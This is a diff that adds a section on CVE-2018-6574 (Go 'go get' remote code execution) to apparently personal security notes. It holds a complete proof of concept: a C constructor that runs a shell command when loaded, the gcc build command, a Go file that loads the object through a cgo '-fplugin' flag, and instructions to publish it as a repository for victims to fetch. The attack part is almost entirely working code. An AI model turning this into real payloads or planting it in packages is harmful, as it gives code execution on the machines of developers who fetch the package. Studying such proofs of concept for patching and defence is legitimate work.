@@ -113,3 +113,52 @@ Upload HTML file and change extension through proxy
 </html>
 ```
 
+### CVE-2018-6574: go get RCE
+
+- This vulnerability was fixed in Go 1.8.7, 1.9.4 and 1.10rc2.
+- When installing a package, Golang will build native extensions.
+
+attack.c
+```
+#include<stdio.h>
+#include<stdlib.h>
+
+static void malicious() __attribute__((constructor));
+
+void malicious() {
+    system("touch /tmp/owned");
+}
+```
+
+```
+$ gcc -shared -o attack.so -fPIC attack.c
+```
+
+```
+package main
+// #cgo CFLAGS: -fplugin=./attack.so
+// typedef int (\*intFunc) ();
+//
+// int
+// bridge_int_func(intFunc f)
+// {
+//      return f();
+// }
+//
+// int fortytwo()
+// {
+//      return 42;
+// }
+import "C"
+import "fmt"
+
+func main() {
+    f := C.intFunc(C.fortytwo)
+    fmt.Println(int(C.bridge_int_func(f)))
+    // Output: 42
+}
+```
+
+Put all three files in a GitHub repository and `go get github.com/abhaynayar/cve-2018-6574`
+
+
